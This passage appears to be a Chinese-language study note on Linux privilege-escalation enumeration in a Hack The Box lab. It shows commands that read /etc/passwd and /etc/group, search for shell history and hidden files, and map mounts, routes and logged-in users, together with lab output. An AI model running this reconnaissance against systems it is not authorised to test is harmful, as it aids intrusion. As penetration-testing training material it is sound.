class="line">HOME_URL=&quot;https://www.ubuntu.com/&quot;</span><br><span class="line">SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br><span class="line">PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br><span class="line">VERSION_CODENAME=focal</span><br><span class="line">UBUNTU_CODENAME=focal</span><br></pre></td></tr></table></figure><h2 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH</span><br><span class="line"></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br></pre></td></tr></table></figure><h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ env</span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PWD=/home/htb-student</span><br><span class="line">LOGNAME=htb-student</span><br><span class="line">XDG_SESSION_TYPE=tty</span><br><span class="line">MOTD_SHOWN=pam</span><br><span class="line">HOME=/home/htb-student</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h2 id="Kernel-version"><a href="#Kernel-version" class="headerlink" title="Kernel version"></a>Kernel version</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line"></span><br><span class="line">Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line"></span><br><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure><h2 id="CPU-version"><a href="#CPU-version" class="headerlink" title="CPU version"></a>CPU version</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ lscpu </span><br><span class="line"></span><br><span class="line">Architecture:                    x86_64</span><br><span class="line">CPU op-mode(s):                  32-bit, 64-bit</span><br><span class="line">Byte Order:                      Little Endian</span><br><span class="line">Address sizes:                   43 bits physical, 48 bits virtual</span><br><span class="line">CPU(s):                          2</span><br><span class="line">On-line CPU(s) list:             0,1</span><br><span class="line">Thread(s) per core:              1</span><br><span class="line">Core(s) per socket:              2</span><br><span class="line">Socket(s):                       1</span><br><span class="line">NUMA node(s):                    1</span><br><span class="line">Vendor ID:                       AuthenticAMD</span><br><span class="line">CPU family:                      23</span><br><span class="line">Model:                           49</span><br><span class="line">Model name:                      AMD EPYC 7302P 16-Core Processor</span><br><span class="line">Stepping:                        0</span><br><span class="line">CPU MHz:                         2994.375</span><br><span class="line">BogoMIPS:                        5988.75</span><br><span class="line">Hypervisor vendor:               VMware</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h2 id="Login-Shells"><a href="#Login-Shells" class="headerlink" title="Login Shells"></a>Login Shells</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/shells</span><br><span class="line"></span><br><span class="line"># /etc/shells: valid login shells</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br></pre></td></tr></table></figure><h2 id="Defense"><a href="#Defense" class="headerlink" title="Defense"></a>Defense</h2><p>通常，没有权限列举这些保护措施的配置，但了解这些保护措施（如果有权限的话）可以帮助不在某些任务上浪费时间。</p><ul><li><a href="https://en.wikipedia.org/wiki/Exec_Shield">Exec Shield</a></li><li><a href="https://linux.die.net/man/8/iptables">iptables</a></li><li><a href="https://apparmor.net/">AppArmor</a></li><li><a href="https://www.redhat.com/en/topics/linux/what-is-selinux">SELinux</a></li><li><a href="https://github.com/fail2ban/fail2ban">Fail2ban</a></li><li><a href="https://www.snort.org/faq/what-is-snort">Snort</a></li><li><a href="https://wiki.ubuntu.com/UncomplicatedFirewall">Uncomplicated Firewall (ufw)</a></li></ul><h2 id="Drives-and-Shares"><a href="#Drives-and-Shares" class="headerlink" title="Drives and Shares"></a>Drives and Shares</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ lsblk</span><br><span class="line"></span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0   55M  1 loop /snap/core18/1705</span><br><span class="line">loop1                       7:1    0   69M  1 loop /snap/lxd/14804</span><br><span class="line">loop2                       7:2    0   47M  1 loop /snap/snapd/16292</span><br><span class="line">loop3                       7:3    0  103M  1 loop /snap/lxd/23339</span><br><span class="line">loop4                       7:4    0   62M  1 loop /snap/core20/1587</span><br><span class="line">loop5                       7:5    0 55.6M  1 loop /snap/core18/2538</span><br><span class="line">sda                         8:0    0   20G  0 disk </span><br><span class="line">├─sda1                      8:1    0    1M  0 part </span><br><span class="line">├─sda2                      8:2    0    1G  0 part /boot</span><br><span class="line">└─sda3                      8:3    0   19G  0 part </span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /</span><br><span class="line">sr0                        11:0    1  908M  0 rom </span><br></pre></td></tr></table></figure><h2 id="lpstat"><a href="#lpstat" class="headerlink" title="lpstat"></a>lpstat</h2><p>查找有关连接到系统的任何打印机的信息。</p><h2 id="fstab"><a href="#fstab" class="headerlink" title="fstab"></a>fstab</h2><p>检查已安装和未安装的驱动器，&#x2F;etc&#x2F;fstab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/fstab</span><br><span class="line"></span><br><span class="line"># /etc/fstab: static file system information.</span><br><span class="line">#</span><br><span class="line"># Use &#x27;blkid&#x27; to print the universally unique identifier for a</span><br><span class="line"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class="line"># that works even if disks are added and removed. See fstab(5).</span><br><span class="line">#</span><br><span class="line"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class="line"># / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation</span><br><span class="line">/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0</span><br><span class="line"># /boot was on /dev/sda2 during curtin installation</span><br><span class="line">/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0</span><br></pre></td></tr></table></figure><h2 id="Route-Table"><a href="#Route-Table" class="headerlink" title="Route Table"></a>Route Table</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ route</span><br><span class="line"></span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">default         _gateway        0.0.0.0         UG    0      0        0 ens192</span><br><span class="line">10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -rn</span><br></pre></td></tr></table></figure><h2 id="Arp-Table"><a href="#Arp-Table" class="headerlink" title="Arp Table"></a>Arp Table</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ arp -a</span><br><span class="line"></span><br><span class="line">_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192</span><br></pre></td></tr></table></figure><h2 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash</span><br><span class="line">bjones:x:1001:1001::/home/bjones:/bin/sh</span><br><span class="line">administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh</span><br><span class="line">backupsvc:x:1003:1003::/home/backupsvc:/bin/sh</span><br><span class="line">cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash</span><br><span class="line">logger:x:1005:1005::/home/logger:/bin/sh</span><br><span class="line">shared:x:1006:1006::/home/shared:/bin/sh</span><br><span class="line">stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash</span><br><span class="line">htb-student:x:1008:1008::/home/htb-student:/bin/bash</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>哈希算法列表：</p><table><thead><tr><th>Algorithm</th><th>Hash</th></tr></thead><tbody><tr><td>Salted MD5</td><td><code>$1$</code>…</td></tr><tr><td>SHA-256</td><td><code>$5$</code>…</td></tr><tr><td>SHA-512</td><td><code>$6$</code>…</td></tr><tr><td>BCrypt</td><td><code>$2a$</code>…</td></tr><tr><td>Scrypt</td><td><code>$7$</code>…</td></tr><tr><td>Argon2</td><td><code>$argon2i$</code>…</td></tr></tbody></table><p>检查哪些用户有登录 shell。一旦看到系统上有哪些 shell，就可以检查每个版本是否存在漏洞。因为过时的版本（例如 Bash 版本 4.1）容易受到<code>shellshock</code>攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ grep &quot;*sh$&quot; /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash</span><br><span class="line">bjones:x:1001:1001::/home/bjones:/bin/sh</span><br><span class="line">administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh</span><br><span class="line">backupsvc:x:1003:1003::/home/backupsvc:/bin/sh</span><br><span class="line">cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash</span><br><span class="line">logger:x:1005:1005::/home/logger:/bin/sh</span><br><span class="line">shared:x:1006:1006::/home/shared:/bin/sh</span><br><span class="line">stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash</span><br><span class="line">htb-student:x:1008:1008::/home/htb-student:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/group</span><br><span class="line"></span><br><span class="line">root:x:0:</span><br><span class="line">daemon:x:1:</span><br><span class="line">bin:x:2:</span><br><span class="line">sys:x:3:</span><br><span class="line">adm:x:4:syslog,htb-student</span><br><span class="line">tty:x:5:syslog</span><br><span class="line">disk:x:6:</span><br><span class="line">lp:x:7:</span><br><span class="line">mail:x:8:</span><br><span class="line">news:x:9:</span><br><span class="line">uucp:x:10:</span><br><span class="line">man:x:12:</span><br><span class="line">proxy:x:13:</span><br><span class="line">kmem:x:15:</span><br><span class="line">dialout:x:20:</span><br><span class="line">fax:x:21:</span><br><span class="line">voice:x:22:</span><br><span class="line">cdrom:x:24:htb-student</span><br><span class="line">floppy:x:25:</span><br><span class="line">tape:x:26:</span><br><span class="line">sudo:x:27:mrb3n,htb-student</span><br><span class="line">audio:x:29:pulse</span><br><span class="line">dip:x:30:htb-student</span><br><span class="line">www-data:x:33:</span><br></pre></td></tr></table></figure><h2 id="getent"><a href="#getent" class="headerlink" title="getent"></a>getent</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ getent group sudo</span><br><span class="line"></span><br><span class="line">sudo:x:27:mrb3n</span><br></pre></td></tr></table></figure><h2 id="home"><a href="#home" class="headerlink" title="&#x2F;home"></a>&#x2F;home</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls /home</span><br><span class="line"></span><br><span class="line">administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins</span><br><span class="line">backupsvc                cliff.moore  logger       shared</span><br></pre></td></tr></table></figure><h2 id="Mount"><a href="#Mount" class="headerlink" title="Mount"></a>Mount</h2><h3 id="已挂载的文件"><a href="#已挂载的文件" class="headerlink" title="已挂载的文件"></a>已挂载的文件</h3><p>挂载文件系统，用户必须具有 root 权限。挂载文件系统后，具有 root 权限的用户可以将其卸载。可能有权访问此类文件系统，并可能在其中找到敏感信息、文档或应用程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br><span class="line"></span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            1,9G     0  1,9G   0% /dev</span><br><span class="line">tmpfs           389M  1,8M  388M   1% /run</span><br><span class="line">/dev/sda5        20G  7,9G   11G  44% /</span><br><span class="line">tmpfs           1,9G     0  1,9G   0% /dev/shm</span><br><span class="line">tmpfs           5,0M  4,0K  5,0M   1% /run/lock</span><br><span class="line">tmpfs           1,9G     0  1,9G   0% /sys/fs/cgroup</span><br><span class="line">/dev/loop0      128K  128K     0 100% /snap/bare/5</span><br><span class="line">/dev/loop1       62M   62M     0 100% /snap/core20/1611</span><br><span class="line">/dev/loop2       92M   92M     0 100% /snap/gtk-common-themes/1535</span><br><span class="line">/dev/loop4       55M   55M     0 100% /snap/snap-store/558</span><br><span class="line">/dev/loop3      347M  347M     0 100% /snap/gnome-3-38-2004/115</span><br><span class="line">/dev/loop5       47M   47M     0 100% /snap/snapd/16292</span><br><span class="line">/dev/sda1       511M  4,0K  511M   1% /boot/efi</span><br><span class="line">tmpfs           389M   24K  389M   1% /run/user/1000</span><br><span class="line">/dev/sr0        3,6G  3,6G     0 100% /media/htb-student/Ubuntu 20.04.5 LTS amd64</span><br><span class="line">/dev/loop6       50M   50M     0 100% /snap/snapd/17576</span><br><span class="line">/dev/loop7       64M   64M     0 100% /snap/core20/1695</span><br><span class="line">/dev/loop8       46M   46M     0 100% /snap/snap-store/599</span><br><span class="line">/dev/loop9      347M  347M     0 100% /snap/gnome-3-38-2004/119</span><br></pre></td></tr></table></figure><h3 id="未挂载的文件系统"><a href="#未挂载的文件系统" class="headerlink" title="未挂载的文件系统"></a>未挂载的文件系统</h3><p>卸载文件系统的原因有很多，例如磁盘被移除，或者不再需要文件系统。另一个原因可能是文件、脚本、文档和其他重要信息不能由标准用户安装和查看。因此，如果可以将权限扩展到用户<code>root</code>，就可以自己安装和读取这些文件系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/fstab | grep -v &quot;#&quot; | column -t</span><br><span class="line"></span><br><span class="line">UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1</span><br><span class="line">UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1</span><br><span class="line">/swapfile                                  none       swap  sw                 0  0</span><br></pre></td></tr></table></figure><h2 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &quot;.*&quot; -exec ls -l &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h2><p>默认情况下，<code>/var/tmp</code>中的所有文件最多保留 30 天， <code>/tmp</code> 中的所有文件会在 10 天后自动删除。<code>/dev/shm</code> 是 Linux 系统中的一个临时文件系统，专门用于共享内存（Shared Memory）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp</span><br><span class="line">/var/tmp</span><br><span class="line">/dev/shm</span><br></pre></td></tr></table></figure><h1 id="Service-Enumeration"><a href="#Service-Enumeration" class="headerlink" title="Service Enumeration"></a>Service Enumeration</h1><h2 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ip a</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:b9:ed:2a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.129.203.168/16 brd 10.129.255.255 scope global dynamic ens192</span><br><span class="line">       valid_lft 3092sec preferred_lft 3092sec</span><br><span class="line">    inet6 dead:beef::250:56ff:feb9:ed2a/64 scope global dynamic mngtmpaddr </span><br><span class="line">       valid_lft 86400sec preferred_lft 14400sec</span><br><span class="line">    inet6 fe80::250:56ff:feb9:ed2a/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"># or</span><br><span class="line">hostname -I</span><br></pre></td></tr></table></figure><h2 id="etc-hosts"><a href="#etc-hosts" class="headerlink" title="&#x2F;etc&#x2F;hosts"></a>&#x2F;etc&#x2F;hosts</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/hosts</span><br><span class="line"></span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 nixlpe02</span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure><h2 id="Last-login"><a href="#Last-login" class="headerlink" title="Last login"></a>Last login</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ lastlog</span><br><span class="line"></span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root                                       **Never logged in**</span><br><span class="line">daemon                                     **Never logged in**</span><br><span class="line">bin                                        **Never logged in**</span><br><span class="line">sys                                        **Never logged in**</span><br><span class="line">sync                                       **Never logged in**</span><br><span class="line">...SNIP...</span><br><span class="line">systemd-coredump                           **Never logged in**</span><br><span class="line">mrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022</span><br><span class="line">lxd                                        **Never logged in**</span><br><span class="line">bjones                                     **Never logged in**</span><br><span class="line">administrator.ilfreight                           **Never logged in**</span><br><span class="line">backupsvc                                  **Never logged in**</span><br><span class="line">cliff.moore      pts/0    127.0.0.1        Tue Aug  2 19:32:29 +0000 2022</span><br><span class="line">logger                                     **Never logged in**</span><br><span class="line">shared                                     **Never logged in**</span><br><span class="line">stacey.jenkins   pts/0    10.10.14.15      Tue Aug  2 18:29:15 +0000 2022</span><br><span class="line">htb-student      pts/0    10.10.14.15      Wed Aug  3 13:37:22 +0000 2022        </span><br></pre></td></tr></table></figure><h2 id="已登陆的用户"><a href="#已登陆的用户" class="headerlink" title="已登陆的用户"></a>已登陆的用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ w</span><br><span class="line"></span><br><span class="line"> 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">who</span><br><span class="line">finger</span><br></pre></td></tr></table></figure><h2 id="Bash-history"><a href="#Bash-history" class="headerlink" title="Bash history"></a>Bash history</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ history</span><br><span class="line"></span><br><span class="line">    1  id</span><br><span class="line">    2  cd /home/cliff.moore</span><br><span class="line">    3  exit</span><br><span class="line">    4  touch backup.sh</span><br><span class="line">    5  tail /var/log/apache2/error.log</span><br><span class="line">    6  ssh ec2-user@dmz02.inlanefreight.local</span><br><span class="line">    7  history</span><br></pre></td></tr></table></figure><p>查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history</span><br></pre></td></tr></table></figure><h2 id="Cron-jobs"><a href="#Cron-jobs" class="headerlink" title="Cron jobs"></a>Cron jobs</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /etc/cron.daily/</span><br><span class="line"></span><br><span class="line">total 48</span><br><span class="line">drwxr-xr-x  2 root root 4096 Aug  2 17:36 .</span><br><span class="line">drwxr-xr-x 96 root root 4096 Aug  2 19:34 ..</span><br><span class="line">-rwxr-xr-x  1 root root  376 Dec  4  2019 apport</span><br><span class="line">-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat</span><br><span class="line">-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils</span><br><span 